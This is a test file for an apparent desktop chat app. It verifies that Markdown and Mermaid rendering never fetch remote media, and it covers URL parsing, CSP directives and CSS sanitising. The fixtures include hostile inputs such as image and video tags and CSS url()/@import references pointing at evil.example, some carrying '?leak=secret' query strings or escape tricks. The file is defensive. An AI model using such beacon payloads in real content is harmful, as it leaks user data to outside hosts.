import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { createInstance } from "i18next";
import { I18nextProvider } from "react-i18next";
import { catalogs } from "@pi-desktop/i18n";
import { createServer } from "vite";
import { fileURLToPath } from "node:url";
import { cachedRemoteMedia, loadRemoteMedia, remoteMediaHost, remoteMediaUrl } from "../src/lib/remote-media.ts";
import { cssHasExternalReference, installSvgCssGuards, sanitizeSvgCss } from "../src/lib/svg-css-guard.ts";

/*
 * ADR 0327: rendering Markdown must never contact a remote host. Remote
 * images, audio, video, `<source>` children, and posters render as
 * click-to-load placeholders with no remote URL in any fetching attribute.
 */

test("remote media classification follows the browser's URL parser", () => {
  assert.equal(remoteMediaUrl("https://evil.example/a.png"), "https://evil.example/a.png");
  assert.equal(remoteMediaUrl("HTTP://evil.example/a.png"), "http://evil.example/a.png");
  assert.equal(remoteMediaUrl("  https://evil.example/a.png"), "https://evil.example/a.png");
  assert.equal(remoteMediaUrl("//evil.example/a.png"), "https://evil.example/a.png");
  assert.equal(remoteMediaUrl("\\\\evil.example\\a.png"), "https://evil.example/a.png");
  assert.equal(remoteMediaUrl("ht\ttps://evil.example/a.png"), "https://evil.example/a.png");
  assert.equal(remoteMediaUrl("https:evil.example/a.png"), "https://evil.example/a.png");
  for (const local of ["./pic.png", "pic.png", "/abs/pic.png", "attachments/abc", "C%3A%5Cpic.png", "data:image/png;base64,AA", "", null]) {
    assert.equal(remoteMediaUrl(local), null, String(local));
  }
  assert.equal(remoteMediaHost("https://cdn.evil.example:8443/a.png"), "cdn.evil.example:8443");
});

test("a clicked item is cached; refusals are not", async () => {
  const calls = [];
  const ok = async (request) => {
    calls.push(request);
    return { ok: true, dataUrl: "data:image/png;base64,AQID", mimeType: "image/png", size: 3 };
  };
  assert.equal(await loadRemoteMedia("https://a.example/1.png", "image", ok), "data:image/png;base64,AQID");
  assert.equal(await loadRemoteMedia("https://a.example/1.png", "image", ok), "data:image/png;base64,AQID");
  assert.equal(calls.length, 1);
  assert.equal(cachedRemoteMedia("https://a.example/1.png", "image"), "data:image/png;base64,AQID");
  assert.equal(cachedRemoteMedia("https://a.example/1.png", "video"), null);
  assert.equal(
    await loadRemoteMedia("https://a.example/2.png", "image", async () => ({ ok: false, reason: "blocked" })),
    null,
  );
  // Main must return a data URL; anything else is discarded.
  assert.equal(
    await loadRemoteMedia("https://a.example/3.png", "image", async () => ({
      ok: true, dataUrl: "https://a.example/3.png", mimeType: "image/png", size: 1,
    })),
    null,
  );
  assert.equal(cachedRemoteMedia("https://a.example/2.png", "image"), null);
});

test("renderer CSP admits no remote image or media origin", () => {
  const html = readFileSync(new URL("../index.html", import.meta.url), "utf8");
  for (const directive of ["img-src", "media-src"]) {
    const value = new RegExp(`${directive} ([^;]*);`).exec(html)?.[1];
    assert.ok(value, directive);
    assert.doesNotMatch(value, /https?:|\*/, directive);
  }
});

test("Mermaid SVG CSS keeps only same-document and data references", () => {
  assert.equal(sanitizeSvgCss(".a{fill:red;marker-end:url(#arrow)}"), ".a{fill:red;marker-end:url(#arrow)}");
  assert.equal(sanitizeSvgCss("fill:url('data:image/png;base64,AA')"), "fill:url('data:image/png;base64,AA')");
  assert.equal(sanitizeSvgCss(".a{background:url(https://evil.example/x?d=1)}"), ".a{background:none}");
  assert.equal(sanitizeSvgCss('.a{background:url( "//evil.example/x" )}'), ".a{background:none}");
  assert.equal(sanitizeSvgCss("@import 'https://evil.example/x.css';.a{fill:red}"), ".a{fill:red}");
  assert.equal(sanitizeSvgCss(".a{background:image-set('https://evil.example/x' 1x)}"), ".a{background:none}");
  // Escapes and comments cannot hide a reference; such CSS is dropped whole.
  assert.equal(cssHasExternalReference(".a{background:u\\72l(https://evil.example/x)}"), true);
  assert.equal(sanitizeSvgCss(".a{background:u\\72l(https://evil.example/x)}"), null);
  assert.equal(sanitizeSvgCss(".a{background:url/**/(https://evil.example/x)}"), null);
  assert.equal(cssHasExternalReference("font-family:var(--font-sans);fill:#fff"), false);
});

test("Mermaid CSS guards rewrite style text and URL-bearing attributes", () => {
  const hooks = {};
  installSvgCssGuards({ addHook: (name, hook) => { hooks[name] = hook; } });
  const style = { nodeName: "style", textContent: "#m .node rect{fill:url(https://evil.example/p)}" };
  hooks.afterSanitizeElements(style);
  assert.equal(style.textContent, "#m .node rect{fill:none}");
  const escaped = { nodeName: "STYLE", textContent: ".a{fill:\\75rl(https://evil.example/p)}" };
  hooks.afterSanitizeElements(escaped);
  assert.equal(escaped.textContent, "");
  const text = { nodeName: "#text", textContent: "url(https://evil.example/label)" };
  hooks.afterSanitizeElements(text);
  assert.equal(text.textContent, "url(https://evil.example/label)");

  const fill = { attrName: "fill", attrValue: "url(https://evil.example/p#g)", keepAttr: true };
  hooks.uponSanitizeAttribute({}, fill);
  assert.equal(fill.attrValue, "none");
  const marker = { attrName: "marker-end", attrValue: "url(#arrowhead)", keepAttr: true };
  hooks.uponSanitizeAttribute({}, marker);
  assert.equal(marker.attrValue, "url(#arrowhead)");
  assert.equal(marker.keepAttr, true);
  const styleAttr = { attrName: "style", attrValue: "fill:\\75rl(https://evil.example/p)", keepAttr: true };
  hooks.uponSanitizeAttribute({}, styleAttr);
  assert.equal(styleAttr.keepAttr, false);
});

test("Markdown renders remote media as placeholders and never emits a remote fetch", async () => {
  const server = await createServer({
    root: fileURLToPath(new URL("..", import.meta.url)),
    configFile: false,
    server: { middlewareMode: true, hmr: false, ws: false },
    esbuild: { jsx: "automatic" },
    appType: "custom",
    optimizeDeps: { noDiscovery: true, include: [] },
  });
  const originalDocument = globalThis.document;
  try {
    globalThis.document = { documentElement: { dataset: {} } };
    const { Markdown } = await server.ssrLoadModule("/src/components/Markdown.tsx");
    const i18n = createInstance();
    await i18n.init({ lng: "en", resources: { en: { translation: catalogs.en } } });
    const render = (source) =>
      renderToStaticMarkup(
        createElement(I18nextProvider, { i18n }, createElement(Markdown, { source })),
      );
    // Any fetching attribute naming a host other than the app itself.
    const remoteFetch = /\s(?:src|poster|srcset)="(?:[a-z]+:)?\/\//i;

    const cases = {
      markdownImage: "![chart](https://evil.example/c.png?leak=secret)",
      protocolRelative: "![x](//evil.example/x.png)",
      rawImg: '<img src="https://evil.example/raw.png?leak=1" alt="raw">',
      rawVideo: '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png" controls></video>',
      rawAudio: '<audio src="https://evil.example/a.mp3" preload="auto" controls></audio>',
      sourceChild: '<video controls><source src="https://evil.example/s.mp4" type="video/mp4"></video>',
      posterOnly: '<video src="clip.mp4" poster="https://evil.example/p.png"></video>',
      picture: '<picture><source srcset="https://evil.example/s.webp"><img src="https://evil.example/i.png"></picture>',
    };
    for (const [name, source] of Object.entries(cases)) {
      const html = render(source);
      assert.doesNotMatch(html, remoteFetch, name);
      assert.doesNotMatch(html, /poster=/, name);
      if (name !== "posterOnly") {
        assert.match(html, /class="chat-remote-media"/, name);
        assert.match(html, /chat-remote-media-host">evil\.example</, name);
        assert.match(html, /<button type="button" class="chat-remote-media-load"/, name);
      }
    }
    assert.match(render(cases.markdownImage), /data-remote-media="image"[^>]*title="Not loaded automatically\. Loading contacts evil\.example\.\nhttps:\/\/evil\.example\/c\.png\?leak=secret"/);
    assert.match(render(cases.markdownImage), />Load image</);
    assert.match(render(cases.rawAudio), /data-remote-media="audio"/);
    assert.match(render(cases.rawVideo), /data-remote-media="video"/);
    assert.match(render(cases.sourceChild), /data-remote-media="video"/);
    assert.doesNotMatch(render(cases.sourceChild), /<source/);

    // Local references are untouched.
    const local = render("![local](./pic.png)");
    assert.match(local, /class="chat-image-chip"/);
    assert.doesNotMatch(local, /chat-remote-media/);
    const localVideo = render('<video src="clip.mp4" controls></video>');
    assert.match(localVideo, /<video[^>]*src="clip\.mp4"/);
    assert.match(localVideo, /preload="metadata"/);
  } finally {
    globalThis.document = originalDocument;
    await server.close();
  }
});
